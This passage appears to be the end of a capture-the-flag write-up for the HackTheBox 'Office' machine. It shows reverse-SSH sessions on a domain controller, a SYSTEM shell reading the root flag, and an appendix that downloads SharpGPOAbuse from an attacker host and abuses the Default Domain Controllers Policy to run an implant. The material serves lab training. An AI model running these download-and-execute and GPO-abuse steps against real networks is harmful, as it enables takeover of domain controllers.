└─$ ssh 127.0.0.1 -p 443 ls -t
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 13841cc29d21500689efa9be840bc6181aee60fe | SSH-v2.4.1-windows_amd64 |
| e9fa95257de800475369fb27e143ed95761f7858 |                          |
| office.ppotts.dc                         |                          |
| 10.10.11.3:55736                         |                          |
+------------------------------------------+--------------------------+
| 3c159c88882d3490a000e603451fc756f3f923ce | SSH-v2.4.1-windows_amd64 |
| e9fa95257de800475369fb27e143ed95761f7858 |                          |
| office.web_account.dc                    |                          |
| 10.10.11.3:55712                         |                          |
+------------------------------------------+--------------------------+
| d621752c4557b5f0d8cd13519b32f81c827478f7 | SSH-v2.4.1-windows_amd64 |
| e9fa95257de800475369fb27e143ed95761f7858 |                          |
| office.hhogan.dc                         |                          |
| 10.10.11.3:56255                         |                          |
+------------------------------------------+--------------------------+
| fa4fac1a9973cfbf3d96441c10cab5170c66ce57 | SSH-v2.4.1-windows_amd64 |
| e9fa95257de800475369fb27e143ed95761f7858 |                          |
| office.tstark.dc                         |                          |
| 10.10.11.3:55725                         |                          |
+------------------------------------------+--------------------------+
| fbbab598b6f5418ae2c586cf6af792b830cd7512 | SSH-v2.4.2-windows_amd64 |
| a4b8b772d301cade899e95da7b0647d3f4eef697 |                          |
| nt.authority.system.dc                   |                          |
| 10.10.11.3:49982                         |                          |
+------------------------------------------+--------------------------+
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Office]
└─$ ssh -J 127.0.0.1:443 nt.authority.system.dc
Warning: Permanently added '[127.0.0.1]:443' (ED25519) to the list of known hosts.
Warning: Permanently added 'nt.authority.system.dc' (ED25519) to the list of known hosts.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> cat C:\users\administrator\desktop\root.txt
b6f38580c3a645518a9806cb20b5b80c
```

# Additional
---

## Abuse GPO with SharpGPOAbuse

> If this error message shows up : `[!] Cannot enumerate domain.`, run `Get-ADDomain` to check if `ActiveDirectory` module was successfully initiated
> 
> If it shows `Get-ADDomain : Server instance not found on the given port.`, just reset the machine
> ![](/assets/obsidian/888232c78063ef8365f51e8d1ab232b1.png)
{: .prompt-danger }

```bash
PS C:\Users\HHogan\Documents> (new-object System.Net.WebClient).DownloadFile('http://10.10.14.99/SharpCollection/NetFramework_4.5_Any/SharpGPOAbuse.exe', '\programdata\SharpGPOAbuse.exe')
PS C:\Users\HHogan\Documents> \programdata\SharpGPOAbuse.exe --AddComputerTask --TaskName "GG" --Author OFFICE\Administrator --Command "cmd.exe" --Arguments "/c C:\programdata\client.exe" --GPOName "Default Domain Controllers Policy" --Force
[+] Domain = office.htb
[+] Domain Controller = DC.office.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
[+] GUID of "Default Domain Controllers Policy" is: {6AC1786C-016F-11D2-945F-00C04fB984F9}
[+] Creating file \\office.htb\SysVol\office.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!

PS C:\Users\HHogan\Documents> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```